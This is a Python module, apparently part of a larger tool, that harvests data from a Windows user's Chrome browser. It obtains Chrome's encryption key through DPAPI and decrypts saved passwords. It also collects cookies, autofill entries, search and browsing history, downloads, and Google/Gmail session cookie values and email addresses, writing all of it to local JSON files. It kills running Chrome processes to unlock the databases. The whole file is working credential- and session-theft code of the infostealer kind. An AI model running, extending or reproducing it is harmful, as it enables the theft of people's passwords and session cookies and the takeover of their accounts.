import os
import shutil
import json
import sqlite3
import re
import urllib.parse
import base64
import win32crypt
import time
import glob
import psutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def get_chrome_encryption_key():
    """Extracts Chrome's encryption key from Local State"""
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    
    # Decrypt using Windows DPAPI
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_chrome_value(encrypted_value, key):
    """Decrypts Chrome-encrypted values"""
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        return decryptor.update(payload).decode()
    except:
        # Fallback for older Chrome versions
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1])
        except:
            return "[DECRYPTION FAILED]"

def find_chrome_cookies():
    """Returns path to active Cookies file or None if not found"""
    # Check standard locations
    possible_roots = [
        os.getenv('LOCALAPPDATA'),
        os.path.expanduser("~"),
        r"C:",
    ]

    possible_paths = []
    for root in possible_roots:
        possible_paths.extend([
            os.path.join(root, r"Google\Chrome\User Data"),
            os.path.join(root, r"Chromium\User Data"),
            os.path.join(root, r"AppData\Local\Google\Chrome\User Data"),
            os.path.join(root, r"AppData\Local\Chromium\User Data"),
        ])

    # Check all possible paths
    for user_data in possible_paths:
        if not os.path.exists(user_data):
            continue

        # Check Default + all profiles
        profiles = ["Default"] + glob.glob(os.path.join(user_data, "Profile *"))
        
        for profile in profiles:
            # Pre-Chrome 94 location
            cookie_path = os.path.join(user_data, profile, "Cookies")
            if os.path.exists(cookie_path):
                return cookie_path
            
            # Chrome 94+ new location
            network_cookie_path = os.path.join(user_data, profile, "Network", "Cookies")
            if os.path.exists(network_cookie_path):
                return network_cookie_path

    return None

def get_chrome_cookies(output_folder):
    """Main cookie extraction function - simplified to avoid decryption failures"""
    # Close Chrome completely
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
            except:
                continue
    time.sleep(2)  # Wait for Chrome to fully exit

    # Find the cookies file
    cookie_path = find_chrome_cookies()
    if not cookie_path:
        print("[!] Could not locate Chrome cookies file in any standard location")
        return False

    print(f"[+] Found cookies at: {cookie_path}")

    # Prepare output
    output_dir = os.path.join(output_folder, "cookies")
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "cookies.json")
    temp_db = os.path.join(output_dir, "temp_cookies.db")

    try:
        # Copy with retry logic
        for attempt in range(3):
            try:
                shutil.copy2(cookie_path, temp_db)
                break
            except PermissionError:
                time.sleep(1)
        else:
            print("[!] Failed to copy cookies database (file locked)")
            return False

        # Extract cookies
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get more useful data without trying to decrypt
        cursor.execute("""
            SELECT host_key, name, path, expires_utc, is_secure, is_httponly, last_access_utc 
            FROM cookies
        """)
        
        cookies = []
        for host, name, path, expires, secure, httponly, last_access in cursor.fetchall():
            cookies.append({
                "host": host,
                "name": name,
                "path": path,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly),
                "last_access": last_access
            })

        # Save results
        with open(output_file, 'w') as f:
            json.dump(cookies, f, indent=4)

        print(f"[+] Successfully extracted {len(cookies)} cookies to {output_file}")
        
        # Also copy the raw database file for later analysis
        raw_db_path = os.path.join(output_dir, "raw_cookies.db")
        shutil.copy2(temp_db, raw_db_path)
        print(f"[+] Raw cookie database saved to {raw_db_path}")
        
        return True

    except Exception as e:
        print(f"[!] Error processing cookies: {str(e)}")
        return False
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

def get_chrome_autofill(output_folder):
    autofill_folder = os.path.join(output_folder, "autofill")
    os.makedirs(autofill_folder, exist_ok=True)
    
    autofill_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Web Data"
    temp_db = os.path.join(autofill_folder, "temp_autofill.db")
    output_file = os.path.join(autofill_folder, "autofill.json")
    
    conn = None  # Initialize to ensure it exists in finally block
    try:
        shutil.copy2(autofill_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        autofill_data = cursor.fetchall()
        
        with open(output_file, "w") as f:
            json.dump(autofill_data, f, indent=4)
        print(f"[+] Autofill data saved to {output_file}")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if conn:  # Close the connection if it exists
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except PermissionError:
                print(f"[!] Could not delete {temp_db} (still locked). Retrying...")
                import time
                time.sleep(1)  # Wait a bit and retry
                os.remove(temp_db)  # Second attempt

def get_chrome_search_history(output_folder):
    """Extract Chrome search history specifically"""
    search_folder = os.path.join(output_folder, "search_history")
    os.makedirs(search_folder, exist_ok=True)
    output_file = os.path.join(search_folder, "search_queries.json")
    
    # Path to Chrome's History file
    history_db = os.path.join(os.environ["USERPROFILE"], 
                             "AppData", "Local", "Google", "Chrome", 
                             "User Data", "Default", "History")
    
    # If the History file doesn't exist, return
    if not os.path.exists(history_db):
        print("[!] Chrome History file not found")
        # Create an empty file to indicate we tried but found nothing
        with open(output_file, "w") as f:
            json.dump({"error": "Chrome History file not found"}, f, indent=4)
        return
    
    # Create a copy of the History file
    temp_db = os.path.join(search_folder, "temp_history.db")
    try:
        shutil.copy2(history_db, temp_db)
    except Exception as e:
        print(f"[!] Error copying history file: {e}")
        with open(output_file, "w") as f:
            json.dump({"error": f"Failed to copy history file: {str(e)}"}, f, indent=4)
        return
    
    conn = None
    try:
        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # First try the keyword_search_terms table
        try:
            cursor.execute("""
                SELECT term, normalized_term
                FROM keyword_search_terms
                LIMIT 100
            """)
            
            # Store the search terms
            searches = []
            for term, normalized_term in cursor.fetchall():
                searches.append({
                    "search_term": term,
                    "normalized_term": normalized_term
                })
            
            if searches:
                # Save the search terms to a file
                with open(output_file, "w") as f:
                    json.dump(searches, f, indent=4)
                print(f"[+] Saved {len(searches)} search queries to {output_file}")
                return
        except Exception as e:
            print(f"[!] Error querying keyword_search_terms: {e}")
        
        # If we get here, try the urls table for Google searches
        try:
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE url LIKE '%google.com/search?q=%'
                ORDER BY last_visit_time DESC
                LIMIT 100
            """)
            
            # Extract search queries from URLs
            searches = []
            for url, title, visit_count, last_visit_time in cursor.fetchall():
                # Extract the search query from the URL
                match = re.search(r'[?&]q=([^&]+)', url)
                if match:
                    query = match.group(1)
                    # URL decode the query
                    query = urllib.parse.unquote_plus(query)
                    searches.append({
                        "search_term": query,
                        "url": url,
                        "title": title,
                        "visit_count": visit_count,
                        "last_visit_time": last_visit_time
                    })
            
            # Save the search terms to a file
            with open(output_file, "w") as f:
                json.dump(searches, f, indent=4)
            print(f"[+] Saved {len(searches)} Google search queries to {output_file}")
            return
        except Exception as e:
            print(f"[!] Error extracting Google searches: {e}")
        
        # If we get here, we couldn't find any search history
        with open(output_file, "w") as f:
            json.dump({"error": "No search history found"}, f, indent=4)
        print("[!] No search history found")
    
    except Exception as e:
        print(f"[!] Error extracting search history: {e}")
        # Create a file with the error
        with open(output_file, "w") as f:
            json.dump({"error": str(e)}, f, indent=4)
    
    finally:
        # Close the connection and remove the temporary file
        if conn:
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception as e:
                print(f"[!] Error removing temp file: {e}")

def get_chrome_passwords(output_folder):
    """Extract Chrome saved passwords"""
    passwords_folder = os.path.join(output_folder, "passwords")
    os.makedirs(passwords_folder, exist_ok=True)
    output_file = os.path.join(passwords_folder, "chrome_passwords.json")
    
    # Path to Chrome's Login Data file
    login_db = os.path.join(os.environ["USERPROFILE"], 
                           "AppData", "Local", "Google", "Chrome", 
                           "User Data", "Default", "Login Data")
    
    # If the Login Data file doesn't exist, return
    if not os.path.exists(login_db):
        print("[!] Chrome Login Data file not found")
        return
    
    # Create a copy of the Login Data file
    temp_db = os.path.join(passwords_folder, "temp_login_data.db")
    shutil.copy2(login_db, temp_db)
    
    try:
        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get the encryption key
        try:
            encryption_key = get_chrome_encryption_key()
        except Exception as e:
            print(f"[!] Failed to get encryption key: {e}")
            return
        
        # Query the database
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        # Decrypt and store the passwords
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            try:
                # Decrypt the password
                decrypted_password = decrypt_chrome_value(encrypted_password, encryption_key)
                
                # Add to the list
                passwords.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password
                })
            except Exception as e:
                print(f"[!] Error decrypting password: {e}")
                passwords.append({
                    "url": url,
                    "username": username,
                    "password": "[DECRYPTION FAILED]"
                })
        
        # Save the passwords to a file
        with open(output_file, "w") as f:
            json.dump(passwords, f, indent=4)
        
        print(f"[+] Saved {len(passwords)} passwords to {output_file}")
    
    except Exception as e:
        print(f"[!] Error extracting passwords: {e}")
    
    finally:
        # Close the connection and remove the temporary file
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

def get_chrome_history(output_folder, history_enabled=True):
    """Extract Chrome browsing history"""
    if not history_enabled:
        print("[*] History collection disabled, skipping...")
        return
        
    history_folder = os.path.join(output_folder, "history")
    os.makedirs(history_folder, exist_ok=True)
    output_file = os.path.join(history_folder, "chrome_history.json")
    
    # Path to Chrome's History file
    history_db = os.path.join(os.environ["USERPROFILE"], 
                             "AppData", "Local", "Google", "Chrome", 
                             "User Data", "Default", "History")
    
    # If the History file doesn't exist, return
    if not os.path.exists(history_db):
        print("[!] Chrome History file not found")
        return
    
    # Create a copy of the History file
    temp_db = os.path.join(history_folder, "temp_history.db")
    shutil.copy2(history_db, temp_db)
    
    try:
        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query the database for the 100 most recent history items
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time 
            FROM urls 
            ORDER BY last_visit_time DESC 
            LIMIT 100
        """)
        
        # Store the history
        history = []
        for url, title, visit_count, last_visit_time in cursor.fetchall():
            history.append({
                "url": url,
                "title": title,
                "visit_count": visit_count,
                "last_visit_time": last_visit_time
            })
        
        # Save the history to a file
        with open(output_file, "w") as f:
            json.dump(history, f, indent=4)
        
        print(f"[+] Saved {len(history)} history items to {output_file}")
    
    except Exception as e:
        print(f"[!] Error extracting history: {e}")
    
    finally:
        # Close the connection and remove the temporary file
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

def get_chrome_downloads(output_folder, downloads_enabled=True):
    """Extract Chrome download history"""
    if not downloads_enabled:
        print("[*] Downloads collection disabled, skipping...")
        return
        
    downloads_folder = os.path.join(output_folder, "downloads")
    os.makedirs(downloads_folder, exist_ok=True)
    output_file = os.path.join(downloads_folder, "chrome_downloads.json")
    
    # Path to Chrome's History file (downloads are stored in the History database)
    history_db = os.path.join(os.environ["USERPROFILE"], 
                             "AppData", "Local", "Google", "Chrome", 
                             "User Data", "Default", "History")
    
    # If the History file doesn't exist, return
    if not os.path.exists(history_db):
        print("[!] Chrome History file not found")
        return
    
    # Create a copy of the History file
    temp_db = os.path.join(downloads_folder, "temp_history.db")
    shutil.copy2(history_db, temp_db)
    
    try:
        # Connect to the database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query the database for downloads
        cursor.execute("""
            SELECT target_path, tab_url, total_bytes, start_time, end_time
            FROM downloads
            ORDER BY start_time DESC
            LIMIT 50
        """)
        
        # Store the downloads
        downloads = []
        for target_path, tab_url, total_bytes, start_time, end_time in cursor.fetchall():
            downloads.append({
                "file_path": target_path,
                "source_url": tab_url,
                "size_bytes": total_bytes,
                "start_time": start_time,
                "end_time": end_time
            })
        
        # Save the downloads to a file
        with open(output_file, "w") as f:
            json.dump(downloads, f, indent=4)
        
        print(f"[+] Saved {len(downloads)} download records to {output_file}")
    
    except Exception as e:
        print(f"[!] Error extracting downloads: {e}")
    
    finally:
        # Close the connection and remove the temporary file
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

# Add this function to your browser_data.py file

def get_chrome_gmail_tokens(output_folder):
    """Extract Gmail tokens and cookies from Chrome"""
    gmail_folder = os.path.join(output_folder, "gmail")
    os.makedirs(gmail_folder, exist_ok=True)
    output_file = os.path.join(gmail_folder, "gmail_tokens.json")
    
    # Close Chrome completely
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
            except:
                continue
    time.sleep(2)  # Wait for Chrome to fully exit
    
    # Find the cookies file
    cookie_path = find_chrome_cookies()
    if not cookie_path:
        print("[!] Could not locate Chrome cookies file in any standard location")
        return False
    
    # Prepare output
    temp_db = os.path.join(gmail_folder, "temp_cookies.db")
    
    try:
        # Copy with retry logic
        for attempt in range(3):
            try:
                shutil.copy2(cookie_path, temp_db)
                break
            except PermissionError:
                time.sleep(1)
        else:
            print("[!] Failed to copy cookies database (file locked)")
            return False
        
        # Extract Gmail cookies
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get Gmail-related cookies
        cursor.execute("""
            SELECT host_key, name, path, value, expires_utc, is_secure, is_httponly, last_access_utc 
            FROM cookies
            WHERE host_key LIKE '%google%' OR host_key LIKE '%gmail%'
        """)
        
        gmail_cookies = []
        for host, name, path, value, expires, secure, httponly, last_access in cursor.fetchall():
            gmail_cookies.append({
                "host": host,
                "name": name,
                "path": path,
                "value": value,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly),
                "last_access": last_access
            })
        
        # Look for Gmail tokens in Local Storage
        local_storage_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "Local Storage", "leveldb"
        )
        
        gmail_tokens = []
        if os.path.exists(local_storage_path):
            for file_name in os.listdir(local_storage_path):
                if file_name.endswith(".ldb"):
                    file_path = os.path.join(local_storage_path, file_name)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read().decode(errors='ignore')
                            
                            # Look for Gmail and Google account identifiers
                            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                            emails = re.findall(email_pattern, content)
                            
                            for email in emails:
                                if email.endswith('@gmail.com') or 'google' in email:
                                    if email not in [token.get('email') for token in gmail_tokens]:
                                        gmail_tokens.append({
                                            "email": email,
                                            "source_file": file_name
                                        })
                    except Exception as e:
                        print(f"[!] Error reading {file_name}: {str(e)}")
        
        # Save results
        result = {
            "gmail_cookies": gmail_cookies,
            "gmail_tokens": gmail_tokens
        }
        
        with open(output_file, 'w') as f:
            json.dump(result, f, indent=4)
        
        print(f"[+] Successfully extracted {len(gmail_cookies)} Gmail cookies and {len(gmail_tokens)} potential Gmail tokens to {output_file}")
        return True
    
    except Exception as e:
        print(f"[!] Error processing Gmail data: {str(e)}")
        return False
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass